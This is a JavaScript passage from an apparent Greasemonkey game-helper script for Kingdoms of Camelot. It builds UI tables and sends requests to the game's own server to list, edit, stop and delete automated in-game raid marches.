		   	if (t.resuming == false && t.stopping == false && t.deleting == false && t.activecount != 0)
 				document.getElementById('pbraidtab').innerHTML = '<span style="color: #ff6">'+culang.stopraids+' ('+ t.activecount + ')</span>'
		   	else if (t.resuming == false && t.stopping == false && t.deleting == false)
				document.getElementById('pbraidtab').innerHTML = '<span style="color: #CCC">'+culang.stopraids+' ('+ t.activecount + ')</span>'
 	   		if (t.resuming == false && t.resuming == false && t.deleting == false && t.stopcount !=0)
				document.getElementById('pbraidtabRes').innerHTML = '<span style="color: #ff6">'+culang.raitack+' ('+ t.stopcount + ')</span>'
	   		else if (t.resuming == false && t.stopping == false && t.deleting == false)
			document.getElementById('pbraidtabRes').innerHTML = '<span style="color: #CCC">'+culang.raitack+' ('+ t.stopcount + ')</span>'
   		if (t.resuming == false && t.stopping == false && t.deleting == false && t.stopcount !=0)
				document.getElementById('pbraidtabDel').innerHTML = '<span style="color: #ff6">'+culang.deleteraid+' ('+ t.stopcount + ')</span>'
	   		else if (t.resuming == false && t.stopping == false && t.deleting == false)
				document.getElementById('pbraidtabDel').innerHTML = '<span style="color: #CCC">'+culang.deleteraid+' ('+ t.stopcount + ')</span>'
  },
   
   	
  paint : function ()	{
  	var t = Tabs.Raid;
  	var botMarchStat = {0: culang.botStatInactive, 1: culang.botStatRaiding, 2: culang.MTreturning,	3: culang.botStatStopped, 4: culang.botStatResting,	5: culang.botStatUnknown, 7: culang.botStatSituationChanged, 8: culang.MTreturning,	9: culang.botStatAborting};
  	var botStat = {0: culang.botStatUndefined,	1: culang.march, 2: culang.MTreturning,	3: culang.botStatStopped, 4: culang.botStatInsufficientTroops, 5: culang.botStatMaxRaidsExceeded, 7: culang.botStatTimedout, 8: culang.botStatResting};
  	//var o = '<FONT size=2px><B>Raid Timer: <span class=boldRed> '+ timestr( 86400 - ( unixTime() - t.rslt.settings.lastUpdated )) +' </span></b></font>';
	var o = '';
	if (t.rslt.settings != undefined) o+= '<FONT size=2px><B>Raid Timer: <span class=boldRed>'+ timestr( 86400 - ( unixTime() - t.rslt.settings.lastUpdated )) +'</span></b></font>';
  	document.getElementById('ptRaidTimer').innerHTML = o;
  	
  	var z ='<TABLE class=pdxTab><TR><TD width=60px align=center><A onclick="pbStopAll('+t.cityId+')">'+culang.stopping+'</a></td><TD width=70px><b>'+culang.time+'</b></td><TD width=85px><b>'+culang.coord+'</b></td><TD width=50px><b>'+culang.level+'</b></td><TD width=50px></td><TD width=50px><A onclick="pbDeleteAll()">'+culang.deleteb+'</a></td></TR>';
  	if (t.rslt['queue'] != ""){
  		for (y in t.rslt['queue']) {
  			if (t.rslt['queue'][y]['botMarches'] != undefined) {
  				for (k in Seed.queue_atkp['city' + t.cityId]){
  					if (Seed.queue_atkp['city' + t.cityId][k]['marchId'] == t.rslt['queue'][y]['botMarches']['marchId']) {
  						botMarchStatus = Seed.queue_atkp['city' + t.cityId][k]['botMarchStatus'];
  						MarchStatus = Seed.queue_atkp['city' + t.cityId][k]['marchStatus'];
  						restPeriod = (Seed.queue_atkp['city' + t.cityId][k]['restPeriod']/60); 
  						destinationUnixTime = Seed.queue_atkp['city' + t.cityId][k]['destinationUnixTime'];
  						returnUnixTime = Seed.queue_atkp['city' + t.cityId][k]['returnUnixTime']
  						now = unixTime();
  						//z+='<TR><TD>('+ botMarchStatus +'/'+ MarchStatus +')</td>';
						z+='<TR>';
  						//if (destinationUnixTime > now && botMarchStatus !=3) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/attacking.jpg></td>';
						if (MarchStatus ==1) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/attacking.jpg></td>';
						//if ((destinationUnixTime - now) <= 0 && botMarchStatus !=3 && returnUnixTime > now) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/returning.jpg></td>';
						if (MarchStatus ==8 && (destinationUnixTime - now) <= 0 && botMarchStatus !=3 && returnUnixTime > now) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/returning.jpg></td>';	
					if (MarchStatus == 3) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_stopped_desat.png></td>';
					//if (returnUnixTime < now  && botMarchStatus !=3) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_resting.png></td>';
					if (MarchStatus == 4 || (returnUnixTime < now  && botMarchStatus !=3)) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_resting.png></td>';
  						if (destinationUnixTime >= now) z+='<TD>'+ timestr(Seed.queue_atkp['city' + t.cityId][k]['destinationUnixTime'] - unixTime())+'</td>';
  						if (destinationUnixTime <= now) {
  							if ((destinationUnixTime - now) <= 0 && returnUnixTime > now) z+='<TD>'+ timestr(returnUnixTime - now)+'</td>';
  							if (returnUnixTime <= now) z+='<TD>'+ timestr(now - returnUnixTime)+'</td>';
  						}
  					}
  				}
  				z+='<TD>('+ t.rslt['queue'][y]['botMarches']['toXCoord'] +','+ t.rslt['queue'][y]['botMarches']['toYCoord']+')</td>';
  				z+='<TD align=center>'+ t.rslt['queue'][y]['botMarches']['toTileLevel'] +'</td>';
  				if (botMarchStatus == 3) z+='<TD><A onclick="pbEditRaid('+ y +')">'+culang.edit+'</a></td>';
	  				else z+='<TD><FONT COLOR= "CCCCCC">'+culang.edit+'</font></td>';
  				if (botMarchStatus == 3) z+='<TD align=center><A onclick="pbDeleteRaid('+ t.rslt['queue'][y]['botMarches']['marchId']+')">'+culang.deleteb+'</a></td>';
  				else z+='<TD align=center><FONT COLOR= "CCCCCC">'+culang.deleteb+'</font></td>';
  				//z +='<TD width=25px></td><TD>Status: '+ botMarchStat[botMarchStatus]+'</td>';
  				z +='<TD width=25px></td><TD><b>'+culang.raidtimer+'</b>:<span class=boldRed> '+ timestr(restPeriod) +'</span></td>';
  				z+='</tr>';
  			}
  		}
  	}
  	z+='</table>';
  	if (t.rslt['queue'] == "") z ='<TABLE class=pdxTab width=100%><TR><TD><center>'+culang.noraidssvd+'</center></td></TR>';
  	document.getElementById('PaintRaids').innerHTML = z;
  	
  	var check = true;
  		if (t.save != ""){
  			var a ='<TABLE class=pdxTab><TR><TD width=60px></td><TD width=70px></td><TD width=85px><b>'+culang.coord+'</b></td><TD width=50px><b>'+culang.level+'</b></td><TD width=50px></td><TD width=50px></td></tr>';
  			for (y in t.save){
  				if (t.save[y] != undefined && t.cityId == t.save[y]['cityId']){
  					a +='<TR><TD align=center><A onclick="pbDeleteSavedRaid('+ t.save[y]['marchId'] +')">X</a></td>';
  					a +='<TD></td><TD><FONT COLOR= "CC0000">('+t.save[y]['toXCoord']+','+t.save[y]['toYCoord']+')</font></td>';
  					a +='<TD align=center>'+t.save[y]['toTileLevel']+'</td>';
  					a +='<TD><A onclick="pbEditSavedRaid('+ y +')">'+culang.edit+'</a></td>';
  					a +='<TD align=center><A onclick="pbAddRaid('+ t.save[y]['marchId']+')">'+culang.add+'</a></td></tr>';
  					check = false;
  				}	
  			}
  			m+='</table>';
  		}
  		
  	if (check) a ='<TABLE class=pdxTab width=100%><TR><TD><BR><b><center>'+culang.noraidssvd+'</center></b></td></TR>';
  	
  	document.getElementById('SavedRaids').innerHTML = a;  	
  	
  	unsafeWindow.pbDeleteRaid = t.DeleteRaid;
  	unsafeWindow.pbEditRaid = t.EditRaid;
  	unsafeWindow.pbAddRaid = t.AddRaid;
  	unsafeWindow.pbDeleteSavedRaid = t.DeleteSavedRaid;
  	unsafeWindow.pbEditSavedRaid = t.EditSavedRaid;
  	unsafeWindow.pbStopAll = t.StopCityRaids;
  	unsafeWindow.pbDeleteAll = t.DeleteCityRaids;
  },
  
  DeleteSavedRaid : function (Id){
    	  var t = Tabs.Raid;
    	  for (yy=0;yy<t.save.length;yy++){
    	  	if (t.save[yy]['marchId'] == Id){
    	  		  t.save.splice (yy,1);
    	  	}	
    	  }
    	  var serverID = getServerId();
    	  setTimeout (function (){GM_setValue ('SavedRaids_'+serverID, JSON2.stringify(t.save));}, 0);
    	  t.paint();
    },
  
  EditSavedRaid : function (y){
      var t = Tabs.Raid;
	  var pop = new CPopup ('pbEditRaid', 0,0, 750,350, true);
	  if (t.popFirst){
	    pop.centerMe (mainPop.getMainDiv());  
	    t.popFirst = false;
	  }
	  pop.getTopDiv().innerHTML = '<div class=showBadged><CENTER><B>'+culang.raid+'</b></center></div>';
	  cityId =  t.save[y]['cityId'];
	  
		  var m = '<BR><TABLE id=pbRaidAdd height=0% class=pdxTab><TR align="center">';
		  m+='<TR></tr><TR><TD width=25px>X= <INPUT id=toXCoord type=text size=3 maxlength=3 value='+t.save[y]['toXCoord']+'></td>';
		  m+='<TD width=10px></td><TD widht=25px>Y= <INPUT id=toYCoord type=text size=3 maxlength=3 value='+ t.save[y]['toYCoord'] +'></td>';
		  m+='<TD width=25px></td><TD>Runden Trip: '+ timestr((t.save[y]['returnUnixTime'] - t.save[y]['destinationUnixTime'])*2)+ '</td></tr></table>';

		  m += '<BR><TABLE id=pbRaidAdd width=100% height=0% class=pdxTab><TR align="center">';
		  m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_1_50_s34.jpg"></td>';
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt1']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_2_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt2']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt3']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt4']) +'</td></tr>'
		  m += '<TR><TD><INPUT id=Unit1 type=text size=6 maxlength=6 value="'+ t.save[y]['unit1Count']+'"></td>';
		  m += '<TD><INPUT id=Unit2 type=text size=6 maxlength=6 value="'+ t.save[y]['unit2Count']+'"></td>';
		  m += '<TD><INPUT id=Unit3 type=text size=6 maxlength=6 value="'+ t.save[y]['unit3Count']+'"></td>';
		  m += '<TD><INPUT id=Unit4 type=text size=6 maxlength=6 value="'+ t.save[y]['unit4Count']+'"></td></tr>';
		  
		  m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_5_50_s34.jpg"></td>';
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt5']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_6_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt6']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_7_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt7']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_8_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt8']) +'</td></tr>'
		  m += '<TR><TD><INPUT id=Unit5 type=text size=6 maxlength=6 value="'+ t.save[y]['unit5Count']+'"></td>';
		  m += '<TD><INPUT id=Unit6 type=text size=6 maxlength=6 value="'+ t.save[y]['unit6Count']+'"></td>';
		  m += '<TD><INPUT id=Unit7 type=text size=6 maxlength=6 value="'+ t.save[y]['unit7Count']+'"></td>';
		  m += '<TD><INPUT id=Unit8 type=text size=6 maxlength=6 value="'+ t.save[y]['unit8Count']+'"></td></tr>';
		  
		  m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_9_50_s34.jpg"></td>';
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt9']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_10_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt10']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_11_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt11']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_12_50_s34.jpg"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt12']) +'</td></tr>'
		  m += '<TR><TD><INPUT id=Unit9 type=text size=6 maxlength=6 value="'+ t.save[y]['unit9Count']+'"></td>';
		  m += '<TD><INPUT id=Unit10 type=text size=6 maxlength=6 value="'+ t.save[y]['unit10Count']+'"></td>';
		  m += '<TD><INPUT id=Unit11 type=text size=6 maxlength=6 value="'+ t.save[y]['unit11Count']+'"></td>';
		  m += '<TD><INPUT id=Unit12 type=text size=6 maxlength=6 value="'+ t.save[y]['unit12Count']+'"></td></tr></table>';
		  
		  m += '<BR><CENTER><SELECT id=AddKnights type=list></select></center>';
		  m+= '<BR><CENTER>'+ strButton20(''+culang.save+'', 'id=pbSaveRaid') +'</center>';
	        
	  pop.getMainDiv().innerHTML = m;
	  
	  t.getKnights(cityId);
	  
	  document.getElementById ('AddKnights').value =  t.save[y]['knightId'];
	  document.getElementById ('pbSaveRaid').addEventListener ('click', function(){
	  			t.save[y]['knightId'] = parseInt(document.getElementById ('AddKnights').value);
	  			t.save[y]['toXCoord'] = parseInt(document.getElementById ('toXCoord').value);
	  			t.save[y]['toYCoord'] = parseInt(document.getElementById ('toYCoord').value);
	  			t.save[y]['unit1Count'] = parseInt(document.getElementById ('Unit1').value);
	  			t.save[y]['unit2Count'] = parseInt(document.getElementById ('Unit2').value);
	  			t.save[y]['unit3Count'] = parseInt(document.getElementById ('Unit3').value);
	  			t.save[y]['unit4Count'] = parseInt(document.getElementById ('Unit4').value);
	  			t.save[y]['unit5Count'] = parseInt(document.getElementById ('Unit5').value);
	  			t.save[y]['unit6Count'] = parseInt(document.getElementById ('Unit6').value);
	  			t.save[y]['unit7Count'] = parseInt(document.getElementById ('Unit7').value);
	  			t.save[y]['unit8Count'] = parseInt(document.getElementById ('Unit8').value);
	  			t.save[y]['unit9Count'] = parseInt(document.getElementById ('Unit9').value);
	  			t.save[y]['unit10Count'] = parseInt(document.getElementById ('Unit10').value);
	  			t.save[y]['unit11Count'] = parseInt(document.getElementById ('Unit11').value);
	  			t.save[y]['unit12Count'] = parseInt(document.getElementById ('Unit12').value);
	  			var serverID = getServerId();
	  			setTimeout (function (){GM_setValue ('SavedRaids_'+serverID, JSON2.stringify(t.save));}, 0);
	  			pop.show (false);
	  }, false);
	  
	  pop.show (true);  	
    },
      
  EditRaid : function (y){
  	  var t = Tabs.Raid;
  	  var pop = new CPopup ('pbEditRaid', 0,0, 750,350, true);
  	  if (t.popFirst){
  	    pop.centerMe (mainPop.getMainDiv());  
  	    t.popFirst = false;
  	  }
  	  pop.getTopDiv().innerHTML = '<div class=showBadged><CENTER><B>'+culang.raids+'</b></center></div>';
  	  cityId = t.rslt['queue'][y]['botMarches']['cityId'];
  	  
  		  var m = '<BR><TABLE id=pbRaidAdd height=0% class=pdxTab><TR align="center">';
  		  m+='<TR></tr><TR><TD width=25px>X= <INPUT id=toXCoord type=text size=3 maxlength=3 value='+t.rslt['queue'][y]['botMarches']['toXCoord']+'></td>';
  		  m+='<TD width=10px></td><TD widht=25px>Y= <INPUT id=toYCoord type=text size=3 maxlength=3 value='+ t.rslt['queue'][y]['botMarches']['toYCoord'] +'></td>';
  		  m+='<TD width=25px></td><TD>'+culang.rounds+' '+culang.time+': '+ timestr((t.rslt['queue'][y]['botMarches']['returnUnixTime'] - t.rslt['queue'][y]['botMarches']['destinationUnixTime'])*2)+ '</td></tr></table>';

  		  m += '<BR><TABLE id=pbRaidAdd width=100% height=0% class=pdxTab><TR align="center">';
  		  m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_1_50_s34.jpg"></td>';
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt1']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_2_50_s34.jpg"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt2']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt3']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt4']) +'</td></tr>'
  		  m += '<TR><TD><INPUT id=Unit1 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit1Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit2 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit2Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit3 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit3Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit4 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit4Count']+'"></td></tr>';
  		  
  		  m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_5_50_s34.jpg"></td>';
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt5']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_6_50_s34.jpg"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt6']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_7_50_s34.jpg"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt7']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_8_50_s34.jpg"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt8']) +'</td></tr>'
  		  m += '<TR><TD><INPUT id=Unit5 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit5Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit6 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit6Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit7 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit7Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit8 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit8Count']+'"></td></tr>';
  		  
  		  m += '<TR><TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_9_50_s34.jpg"></td>';
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt9']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_10_50_s34.jpg"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt10']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_11_50_s34.jpg"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt11']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_12_50_s34.jpg"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt12']) +'</td></tr>'
  		  m += '<TR><TD><INPUT id=Unit9 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit9Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit10 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit10Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit11 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit11Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit12 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit12Count']+'"></td></tr></table>';
  		  
  		  m += '<BR><CENTER><SELECT id=AddKnights type=list></select></center>';
  		  m+= '<BR><CENTER>'+ strButton20(''+culang.save+'', 'id=pbRaidSave') +'</center>';
  	        
  	  pop.getMainDiv().innerHTML = m;
  	  
  	  t.getKnights(cityId);
  	  
  	  document.getElementById ('AddKnights').value =  t.rslt['queue'][y]['botMarches']['knightId'];
  	  document.getElementById ('pbRaidSave').addEventListener ('click', function(){
  	  	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  	  			  		
  	  	params.pf = 0;
  	      params.ctrl = 'BotManager';
  	  	params.action = 'editMarch';
  	  	params.settings = {};
  	  	params.settings.cityId = t.rslt['queue'][y]['botMarches']['fromCityId'];
  	  	params.queue = {0:{botMarches:{botMarchStatus:1,botState:1},cityMarches:{}}};    	
  	  	params.queue[0].cityMarches.knightId = parseInt(document.getElementById ('AddKnights').value);
  	  	params.queue[0].cityMarches.toXCoord =  parseInt(document.getElementById ('toXCoord').value);
  	  	params.queue[0].cityMarches.toYCoord =  parseInt(document.getElementById ('toYCoord').value);
  	  	params.queue[0].cityMarches.unit0Count = 0; //document.getElementById ('Unit0').value;
  	  	params.queue[0].cityMarches.unit1Count =  parseInt(document.getElementById ('Unit1').value);
  	  	params.queue[0].cityMarches.unit2Count = parseInt(document.getElementById ('Unit2').value);
  	  	params.queue[0].cityMarches.unit3Count = parseInt(document.getElementById ('Unit3').value);
  	  	params.queue[0].cityMarches.unit4Count = parseInt(document.getElementById ('Unit4').value);
  	  	params.queue[0].cityMarches.unit5Count = parseInt(document.getElementById ('Unit5').value);
  	  	params.queue[0].cityMarches.unit6Count = parseInt(document.getElementById ('Unit6').value);
  	  	params.queue[0].cityMarches.unit7Count = parseInt(document.getElementById ('Unit7').value);
  	  	params.queue[0].cityMarches.unit8Count = parseInt(document.getElementById ('Unit8').value);
  	  	params.queue[0].cityMarches.unit9Count = parseInt(document.getElementById ('Unit9').value);
  	  	params.queue[0].cityMarches.unit10Count = parseInt(document.getElementById ('Unit10').value);
  	  	params.queue[0].cityMarches.unit11Count = parseInt(document.getElementById ('Unit11').value);
  	  	params.queue[0].cityMarches.unit12Count = parseInt(document.getElementById ('Unit12').value);
  	  	params.queue[0].cityMarches.marchId =  t.rslt['queue'][y]['botMarches']['marchId'];
  	  	
  	  	 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  				  		method: "post",
  				         parameters: params,
  						 loading: true,
  						 onSuccess: function(transport){
  							var rslt = eval("(" + transport.responseText + ")");
  		                      if (rslt.ok) {
  		                      		pop.show (false);
  									unsafeWindow.cityinfo_army();
  		                          setTimeout(unsafeWindow.update_seed_ajax, 250);
  		                          setTimeout(t.GetRaids, (750),Seed.cities[i][0]);
  								}
  						 },
  				 });
  	  	}, false);
  	  
  	  pop.show (true);  	
  },
  
  DeleteRaid : function (Id){
  	var t = Tabs.Raid;
  	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  	
  	for (y in t.rslt['queue']) {
  		if (t.rslt['queue'][y]['botMarches'] != undefined) {
	  		if (t.rslt['queue'][y]['botMarches']['marchId'] == Id) {
	  				marchId = t.rslt['queue'][y]['botMarches']['marchId'];
	  				cityId = t.rslt['queue'][y]['botMarches']['cityId'];
	  				knightId = t.rslt['queue'][y]['botMarches']['knightId'];
	  				toTileLevel = t.rslt['queue'][y]['botMarches']['toTileLevel'];
	  				returnUnixTime = t.rslt['queue'][y]['botMarches']['returnUnixTime'];
	  				destinationUnixTime = t.rslt['queue'][y]['botMarches']['destinationUnixTime'];
	  				toXCoord = t.rslt['queue'][y]['botMarches']['toXCoord'];
	  				toYCoord = t.rslt['queue'][y]['botMarches']['toYCoord'];
	  				var units = {};
	  				for (i=1;i<13;i++) units[i] = t.rslt['queue'][y]['botMarches']['unit'+i+'Count'];
	  		}
	  	}
  	}	
  	
  	params.pf = 0;
  	params.ctrl = 'BotManager';
  	params.action = 'deleteMarch';
  	params.marchId = marchId;
  	params.settings = {};
  	params.settings.cityId = cityId;
  	
    new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  	         method: "post",
  	         parameters: params,
  			 loading: true,
  			 onSuccess: function(transport){
  				var rslt = eval("(" + transport.responseText + ")");
  	              	if (rslt.ok) {
  	              	  var serverID = getServerId();
  	              	 t.save = GM_getValue ('SavedRaids_'+serverID, "[]");
  	              	  if (t.save == undefined) t.save =new Array();
					  else t.save = JSON2.parse (t.save);

  	              	  t.save.push ({marchId: marchId, cityId: cityId, knightId:	knightId, toTileLevel:	toTileLevel,  returnUnixTime:	destinationUnixTime, returnUnixTime:	returnUnixTime,  toXCoord:		toXCoord,	toYCoord: toYCoord, unit1Count: 	units[1], unit2Count: 	units[2], unit3Count: 	units[3], unit4Count: 	units[4], unit5Count: 	units[5], unit6Count: 	units[6], unit7Count: 	units[7], unit8Count: 	units[8], unit9Count: 	units[9], unit10Count: 	units[10], unit11Count: 	units[11], unit12Count: 	units[12], });
					  var troops = Seed.units["city" + cityId];
	    	              	  for (var u = 1; u <= 12; ++u) {
	    	              	      var troop_number = parseInt(rslt["unit" + u + "Return"]);
	    	              	      if (isNaN(troop_number)) {
	    	              	          troop_number = parseInt(Seed.units["city" + cityId]["unt" + u]);
	    	              	      } else troop_number = parseInt(rslt["unit" + u + "Return"]) + parseInt(Seed.units["city" + cityId]["unt" + u]);
	    	              	      troops["unt" + u] = troop_number;
	    	              	  }
  	              	  GM_setValue ('SavedRaids_'+serverID, JSON2.stringify(t.save));
					  t.save = null;
                      unsafeWindow.cityinfo_army();	  
  	                  setTimeout(unsafeWindow.update_seed_ajax, 250);
  	                 
  					}
  			 },
  	 });
},
  
  StopCityRaids : function (cityId){
    	var t = Tabs.Raid;
    	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

    	
    	params.pf = 0;
    	params.ctrl = 'BotManager';
    	params.action = 'stopAll';
    	params.settings = {};

  	    params.settings.cityId = cityId;
  	    		
    	 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
    		  		method: "post",
    		         parameters: params,
    				 loading: true,
    				 onSuccess: function(transport){
    					var rslt = eval("(" + transport.responseText + ")");
    	                  if (rslt.ok) {
  								
    					  }
    				 },
    		 });   
    setTimeout(t.GetRaids, (750), cityId); 	
    },
  
  StopAllRaids : function (){
      	var t = Tabs.Raid;
      	if (t.stopping == true || t.resuming == true || t.deleting == true) return;
      	if (t.activecount == 0) return;
	    t.stopping = true; 	
	      	for (i=0;i<Seed.cities.length;i++){
		      	setTimeout(t.DoAllStop, (i*1500),i);
		     }
   },
   
   ResumeAllRaids : function (){
       	var t = Tabs.Raid;
       	if (t.stopping == true || t.resuming == true || t.deleting == true) return;
       	if (t.stopcount == 0) return;
       	t.resuming = true;
   			for (i=0;i<Seed.cities.length;i++){
   			    setTimeout(t.DoAllResume, (i*1500),i);
   			}
    },
   
   
   DeleteAllRaids : function (){
       	var t = Tabs.Raid;
       	if (t.stopping == true || t.resuming == true || t.deleting == true) return;
       	if (t.stopcount == 0) return;
       	t.deleting = true;
       	count=0;
       	t.count = t.stopcount;
				for (d=0; d< Seed.cities.length;d++) {
						cityID = 'city' + Seed.cities[d][0];    
							for (e in Seed.queue_atkp[cityID]){
								destinationUnixTime = Seed.queue_atkp[cityID][e]['destinationUnixTime']; 
								MarchStatus = Seed.queue_atkp[cityID][e]['marchStatus'];
								MarchType = Seed.queue_atkp[cityID][e]['marchType'];
								if (MarchType == 9 && (botMarchStatus == 3 || MarchStatus == 3)) {
									count++;
									setTimeout(t.DoAllDelete, (count*1250), (Seed.queue_atkp[cityID][e]['marchId']),d,count);
								}
							}
				}
    }, 
    
  DoAllStop: function(i) {
    var t = Tabs.Raid;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  	params.pf = 0;
  	params.ctrl = 'BotManager';
  	params.action = 'stopAll';
  	params.settings = {};
  	params.settings.cityId = Seed.cities[i][0];
  	    		
  		 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  			  		method: "post",
  			         parameters: params,
  					 loading: true,
  					 onSuccess: function(transport){
  						var rslt = eval("(" + transport.responseText + ")");
  		                  if (rslt.ok) {
  		                  		t.stopprogress = t.stopprogress + (100/Seed.cities.length);
  		                  		actionLog('<b>'+culang.stopraids+'</b> '+ Seed.cities[i][1]);
  		                  		updatebotbutton(''+culang.stopraids+' '+ t.stopprogress.toFixed(0) + '%', 'pbraidtab');
  		                  		if (t.stopprogress.toFixed(0) == 100) {
  		                  			 t.stopprogress = 0;
  		                  			 setTimeout(function(){updatebotbutton(''+culang.stopraids+' ('+ t.activecount + ')', 'pbraidtab');t.stopping = false;}, (5000));
